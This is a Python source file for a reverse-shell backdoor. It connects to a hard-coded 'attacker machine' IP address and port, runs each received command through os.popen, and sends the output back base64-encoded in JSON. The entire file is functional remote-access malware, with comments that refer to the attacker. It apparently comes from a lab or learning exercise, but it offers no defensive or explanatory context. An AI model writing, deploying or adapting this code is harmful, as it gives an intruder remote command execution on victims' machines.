import socket
import os
import time
import json
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send(b"\n[+] Connection established.\n\n")

    def reliable_send(self, data):
        # Convert bytes object to Base64 encoded string
        encoded_data = base64.b64encode(data).decode()
        # Send the encoded data
        json_data = json.dumps(encoded_data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            json_data = json_data + self.connection.recv(1024).decode()
            if json_data:
                try:
                    return json.loads(json_data)
                except json.JSONDecodeError:
                    print("[!] Received data is not in valid JSON format.")
            else:
                print("[!] No data received.")
            return None

    def execute_system_command(self, command):
        """
        Executes a system command and returns the result.
        """
        try:
            # Execute the command using os.system()
            result = os.popen(command).read()
            return result.encode()
        except Exception as e:
            # Return any error that occurs during command execution
            return str(e).encode()

    def run(self):
        # Receive commands and execute them indefinitely
        while True:
            # Receive command from the attacker
            command = self.reliable_receive()
            if command:
                command = command.strip()

                # Execute the command and get the result
                command_result = self.execute_system_command(command)

                # Send the command result back to the attacker
                self.reliable_send(command_result + b"\n")

                # Flush the output to ensure immediate sending
                self.connection.send(b'\n\r\n\r')

                # Clear the buffer by receiving any remaining data
                self.connection.recv(1024)

                # Add a small delay to allow synchronization
                time.sleep(0.1)

    def close(self):
        # Close the connection
        self.connection.close()

if __name__ == "__main__":
    backdoor = Backdoor("192.168.254.128", 4444)    #attacker machine ip
    backdoor.run()
